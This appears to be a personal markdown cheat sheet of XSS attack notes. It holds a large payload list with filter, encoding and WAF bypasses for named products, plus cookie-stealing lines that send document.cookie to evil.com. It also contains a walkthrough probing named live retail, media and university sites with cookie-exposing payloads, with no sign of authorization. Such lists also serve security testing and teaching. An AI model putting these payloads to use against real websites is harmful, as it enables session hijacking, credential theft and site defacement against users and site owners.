

- Payload Crafting and Testing
    - Basic XSS Payloads:
        Start with simple scripts: <script>alert('XSS')</script>
    - Test inputs in query parameters, POST data, and headers.

- Bypass Filters:
    - Test encoded payloads: <img src=x onerror=alert('XSS')> %3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
    - Use different encodings: URL encoding, HTML entities, Base64.

- DOM-Based XSS:
    - Inject payloads into DOM-exposed inputs and observe changes: <img src=x onerror=console.log(document.domain)>
    - Look for vulnerable JavaScript using tools like browser DevTools.

- Contextual Testing:
    - Payloads vary depending on the context:
        - HTML Context: <img src=x onerror=alert('XSS')>
        - JavaScript Context: '); alert('XSS');//
        - Attribute Context: " onmouseover=alert('XSS') ".


1. Reflected XSS is also sometimes referred to as Non-Persistent or Type-II XSS.
2. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.
3. DOM Based XSS also referred to in some texts as type-0 XSS.

# Reflected XSS
1. find input/url wich is vulnerable
2. try to POC 
    - ?q=<i>test</i>
    - ?q=<font color="red">More HTML tag;
    - ?q=hasanqoli<font color="red">More HTML tag;
3. try more html tag with url encoding via https://dencode.com/
    - ?q=%3Cfont%20color%3D%22red%22%3EMore%20HTML%20tag%3B
    - ?q=%3Cimg%20src%2Fonerror%3Dprompt%28document.cookie%29%3E
    - ?q=%0D%22%3E%3Ciframe%20src%3D%22https%3A%2F%2Fwww.cia.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E
    - ?q=%0D%3Cimg%20src%3DOnXSS%20onerror%3Dconfirm%28document.cookie%29%3E

# XSS file
1. find file upload function
2. upload "><img src=x onerror=alert(document.domain)>.jpg


# DOM based XSS 
https://github.com/wisec/domxsswiki/wiki
Manually testing for DOM-based XSS is a very time-consuming task. You have to track the flow of user input from the source to the sink.

1. looking HTML sinks in Firefox Inspector, and Javascript sinks in Firefox Debugger.




https://xss-quiz.int21h.jp
https://www.ascii-code.com/
https://www.cobalt.io/blog/a-pentesters-guide-to-cross-site-scripting-xss
https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#Why_Can.27t_I_Just_HTML_Entity_Encode_Untrusted_Data.3F



# XSS Sample
1. type test in search input
2. check url and reflected test in page
    https://www.nobullproject.com/collections/shop?q=test           => Search results for "test" in the page
3. try simple html tag
    https://www.nobullproject.com/collections/shop?q=<i>test</i>    => XSS POC : No results for "test" found  "test" in italic
4. try more hatml tag
    https://www.nobullproject.com/collections/shop?q=<font color="red">More HTML tag;    => No results for "" found 
5. try more html tag with some text
    https://www.nobullproject.com/collections/shop?q=hasanqoli<font color="red">More HTML tag; => No results for "hasanqoli" found
    Looking in page for hasanqoli to see how html rendered. => https://www.nobullproject.com/collections/shop?q=hasanqoli%3cfont+color%3d%22red%22%3emore+html+tag => WE FOUND the page using URL encoding
6. try more html tag with url encoding via https://dencode.com/
    https://www.nobullproject.com/collections/shop?q=%3Cfont%20color%3D%22red%22%3EMore%20HTML%20tag%3B
7. try XSS payload
    https://www.nobullproject.com/collections/shop?q=%3Cimg%20src%2Fonerror%3Dprompt%28document.cookie%29%3E
8. try iframe injection
    https://www.nobullproject.com/collections/shop?q=%0D%22%3E%3Ciframe%20src%3D%22https%3A%2F%2Fwww.cia.gov%2F%22%20style%3D%22border%3A%200%3B%20position%3Afixed%3B%20top%3A0%3B%20left%3A0%3B%20right%3A0%3B%20bottom%3A0%3B%20width%3A100%25%3B%20height%3A100%25%22%3E
9.  
    https://www.nobullproject.com/collections/shop?q=%0D%3Cimg%20src%3DOnXSS%20onerror%3Dconfirm%28document.cookie%29%3E
    https://www.techtarget.com/whatis/search/query?q=%3Cimg%20src=OnXSS%20onerror=confirm(document.cookie)%3E
    https://summer.harvard.edu/search/?live_global%5Bquery%5D=%3Cimg%20src%2Fonerror%3Dprompt%28document.cookie%29%3E

    %0D<img src%3DOnXSS onerror%3Dconfirm(document.cookie)>

    

## Find XSS vulnerabilities
<i>test</i>
<i>hasanqoli</i>
"><h1>test</h1>
'+alert(1)+'
onmouseover="alert(1)"
http://"onmouseover="alert(1)




## How to Exploit XSS?
1. Find the blacklisted/filtered characters.
    - Use XSS locators:  hasanqoli'';! - "<XSS>=&{()}
2. Observe what tags are blocked by WAF and which keywords are allowed.
    - script
    - iframe
    - img
    - body
    - a
3. Try Character Encoding
    - URL encoding
    - Double URL encoding 
    - UTF-8 Unicode encoding
    - Long UTF-8 Unicode encoding 
    - Hex encoding
4. Try XSS using HTML quote encapsulation
5. Try URL string evasion
6. Create the payload list according to the allowed keywords
7. Brute-force the application with the XSS payload list you just created



## What’s the Impact of XSS?
An attacker who exploits a cross-site scripting vulnerability is typically able to:
- Impersonate or masquerade as the victim user
- Hijack a user’s session
- Perform unauthorized activities
- Steal sensitive information
- Perform phishing attacks
- Capture the user’s login credentials.
- Capture keystrokes
- Deface the website.
- Inject trojan functionality into the website.

<script>alert(document.domain);</script>
<a href="javascript:alert(document.domain)">javascript:alert(document.domain)</a>
"><svg/onload=confirm(1)>"@gmail.com



## XSS Payload
--------------------------------------------------------------------
XSS Locators:
'q';!--"xss"<XSS>=&{(p)}
"><h1>test</h1>
'+alert(1)+'
onmouseover="alert(1)"
http://"onmouseover="alert(1)
--------------------------------------------------------------------
Classic Payloads:
<svg onload=alert(1)>
"><svg onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script src=data:&comma;alert(1)//
--------------------------------------------------------------------
script tag filter bypass:
<svg/onload=alert(1)>
<script>alert(1)</script>
<script     >alert(1)</script>
<ScRipT>alert(1)</sCriPt>
<%00script>alert(1)</script>
<script>al%00ert(1)</script>
--------------------------------------------------------------------
HTML tags:
<img/src=x a='' onerror=alert(1)>
<IMG """><SCRIPT>alert(1)</SCRIPT>">
<img src=`x`onerror=alert(1)>
<img src='/' onerror='alert("kalisa")'>
<IMG SRC=# onmouseover="alert('xxs')">
<IMG SRC= onmouseover="alert('xxs')">
<IMG onmouseover="alert('xxs')">
<BODY ONLOAD=alert('XSS')>
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
<SCRIPT SRC=http:/evil.com/xss.js?< B >
"><XSS<test accesskey=x onclick=alert(1)//test
<svg><discard onbegin=alert(1)>
<script>image = new Image(); image.src="https://evil.com/?c="+document.cookie;</script>
<script>image = new Image(); image.src="http://"+document.cookie+"evil.com/";</script>
--------------------------------------------------------------------
Other tags:
<BASE HREF="javascript:alert('XSS');//">
<DIV STYLE="width: expression(alert('XSS'));">
<TABLE BACKGROUND="javascript:alert('XSS')">
<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
<xss id=x tabindex=1 onactivate=alert(1)></xss>
<xss onclick="alert(1)">test</xss>
<xss onmousedown="alert(1)">test</xss>
<body onresize=alert(1)>”onload=this.style.width=‘100px’>
<xss id=x onfocus=alert(document.cookie)tabindex=1>#x’;</script>
hasanqoli" onfocus='alert(document.domain)'
<input type="hidden" name="p3" value="hasanqoli" accesskey="X" onclick="alert(document.domain)">
--------------------------------------------------------------------CharCode:
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
--------------------------------------------------------------------
if the input is already in script tag:
@domain.com">user+'-alert`1`-'@domain.com
--------------------------------------------------------------------AngularJS: 




toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,11 4,116,40,49,41)
--------------------------------------------------------------------
Scriptless:
<link rel=icon href="//evil?
<iframe src="//evil?
<iframe src="//evil?
<input type=hidden type=image src="//evil?
--------------------------------------------------------------------
Unclosed Tags:
<svg onload=alert(1)//
--------------------------------------------------------------------
DOM XSS:
“><svg onload=alert(1)>
<img src=1 onerror=alert(1)>
javascript:alert(document.cookie)
\“-alert(1)}//
<><img src=1 onerror=alert(1)>
--------------------------------------------------------------------
Another case:
param=abc`;return+false});});alert`xss`;</script>
abc`; Finish the string
return+false}); Finish the jQuery click function
}); Finish the jQuery ready function
alert`xss`; Here we can execute our code
</script> This closes the script tag to prevent JavaScript parsing errors
-------------------------------------------------------------------- 


## Restrictions Bypass
--------------------------------------------------------------------
No parentheses:
<script>onerror=alert;throw 1</script>
<script>throw onerror=eval,'=alert\x281\x29'</script>
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
<script>location='javascript:alert\x281\x29'</script>
<script>alert`1`</script>
<script>new Function`X${document.location.hash.substr`1`}`</script>
--------------------------------------------------------------------
No parentheses and no semicolons:
<script>{onerror=alert}throw 1</script>
<script>throw onerror=alert,1</script>
<script>onerror=alert;throw 1337</script>
<script>{onerror=alert}throw 1337</script>
<script>throw onerror=alert,'some string',123,'haha'</script>
--------------------------------------------------------------------
No parentheses and no spaces:
<script>Function`X${document.location.hash.substr`1`}```</script>
--------------------------------------------------------------------
Angle brackets HTML encoded (in an attribute):
“onmouseover=“alert(1)
‘-alert(1)-’
--------------------------------------------------------------------
If quote is escaped:
‘}alert(1);{‘
‘}alert(1)%0A{‘
\’}alert(1);{//
--------------------------------------------------------------------
Embedded tab, newline, carriage return to break up XSS:
<IMG SRC="jav&#x09;ascript:alert('XSS');">
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
--------------------------------------------------------------------
Other:
<svg/onload=eval(atob(‘YWxlcnQoJ1hTUycp’))>: base64 value which is alert(‘XSS’)
--------------------------------------------------------------------

## Encoding
--------------------------------------------------------------------
Unicode:
<script>\u0061lert(1)</script>
<script>\u{61}lert(1)</script>
<script>\u{0000000061}lert(1)</script>
--------------------------------------------------------------------
Hex:
<script>eval('\x61lert(1)')</script>
--------------------------------------------------------------------
HTML:
<svg><script>&#97;lert(1)</script></svg>
<svg><script>&#x61;lert(1)</script></svg>
<svg><script>alert&NewLine;(1)</script></svg>
<svg><script>x="&quot;,alert(1)//";</script></svg>
\’-alert(1)//
--------------------------------------------------------------------
URL:
<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
--------------------------------------------------------------------
Double URL Encode:
%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
%2522%253E%253Csvg%2520o%256Enoad%253Dalert%25281%2529%253E
--------------------------------------------------------------------
Unicode + HTML:
<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>
--------------------------------------------------------------------
HTML + URL:
<iframe src="javascript:'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;'"></iframe>
--------------------------------------------------------------------


## WAF Bypass
--------------------------------------------------------------------
Imperva Incapsula:
%3Cimg%2Fsrc%3D%22x%22%2Fonerror%3D%22prom%5Cu0070t%2526%2523x28%3B%2526%25 23x27%3B%2526%2523x58%3B%2526%2523x53%3B%2526%2523x53%3B%2526%2523x27%3B%25 26%2523x29%3B%22%3E
<img/src="x"/onerror="[JS-F**K Payload]">
<iframe/onload='this["src"]="javas&Tab;cript:al"+"ert``"';><img/src=q onerror='new Function`al\ert\`1\``'>
--------------------------------------------------------------------WebKnight:
<details ontoggle=alert(1)>
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
--------------------------------------------------------------------
F5 Big IP:
<body style="height:1000px" onwheel="[DATA]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[DATA]">
<body style="height:1000px" onwheel="[JS-F**k Payload]">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="[JS-F**k Payload]">
<body style="height:1000px" onwheel="prom%25%32%33%25%32%36x70;t(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="prom%25%32%33%25%32%36x70;t(1)">
--------------------------------------------------------------------Barracuda WAF:
<body style="height:1000px" onwheel="alert(1)">
<div contextmenu="xss">Right-Click Here<menu id="xss" onshow="alert(1)">
--------------------------------------------------------------------
PHP-IDS:
<svg+onload=+"[DATA]"
<svg+onload=+"aler%25%37%34(1)"
--------------------------------------------------------------------
Mod-Security:
<a href="j[785 bytes of (&NewLine;&Tab;)]avascript:alert(1);">XSS</a>
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
<b/%25%32%35%25%33%36%25%36%36%25%32%35%25%33%36%25%36%35mouseover=alert(1)>
--------------------------------------------------------------------
Quick Defense:
<input type="search" onsearch="aler\u0074(1)">
<details ontoggle="aler\u0074(1)">
--------------------------------------------------------------------
Sucuri WAF:
1⁄4script3⁄4alert(¢xss¢)1⁄4/script3⁄4
--------------------------------------------------------------------


# find 4 Cross-site scripting (XSS)
How I was able to find 4 Cross-site scripting (XSS) on vulnerability disclosure program ?
https://medium.com/@DrakenKun/how-i-was-able-to-find-4-cross-site-scripting-xss-on-vulnerability-disclosure-program-e2f39199ae16

1. I used ParamSpider for finding some interested parameters.
```sh
python3 paramaspider -d example.com -o parameters.txt 
```

2. see every reflected parameters and unfiltered values
```sh
cat parameters.txt | kxss 
cat results/tomtom.com.txt | kxss | tee tomtom.com.kxss
```
The vulnerable parameter for XSS should have Unfiltered : [“ ‘ < > $ | ( ) ` : ; { } ]

3. try XSS payloads.
